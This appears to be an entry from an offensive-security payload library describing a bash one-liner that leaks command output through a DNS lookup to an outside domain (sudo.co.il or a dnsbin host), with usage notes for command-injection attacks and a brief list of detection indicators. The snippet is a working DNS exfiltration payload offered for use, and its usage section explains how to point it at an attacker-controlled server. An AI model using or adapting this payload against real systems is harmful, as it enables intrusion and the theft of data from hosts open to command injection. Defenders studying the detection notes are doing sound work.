---
id: 67835af6-e7c4-4d7e-a50d-ced2e8e57713
name: bash-dns-exfil-wget-help
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:57.488976+00:00'
updated_at: '2023-04-06T03:55:57.503357+00:00'
platforms:
  - Linux
tags:
  - exfiltration
  - dns
  - payload
validated: true
---

# bash-dns-exfil-wget-help

## Code

```bash
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

## Description

This bash snippet exfiltrates the first line of `wget --help` output by processing it (replacing spaces/commas with dashes, removing dots) and using it as a subdomain in a DNS query to a custom domain like sudo.co.il. Adaptable for dnsbin by changing the domain.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $DOMAIN | Target domain for DNS query (e.g., sudo.co.il or $_SUBDOMAIN.dnsbin.zhack.ca) | sudo.co.il |

## Usage

Use in command injection contexts to leak command output. Substitute the domain with a controlled DNS server. The processed output becomes the subdomain, sending data via the query.

## Detection

- Suspicious `host` or `dig` commands in logs with dynamically generated subdomains.
- High entropy in DNS subdomains from internal hosts.
- Correlate with command injection attempts in app logs.

## Related

- [[procedures/DNS-Data-Exfiltration-via-Command-Injection]]
- [[tools/dnsbin]]
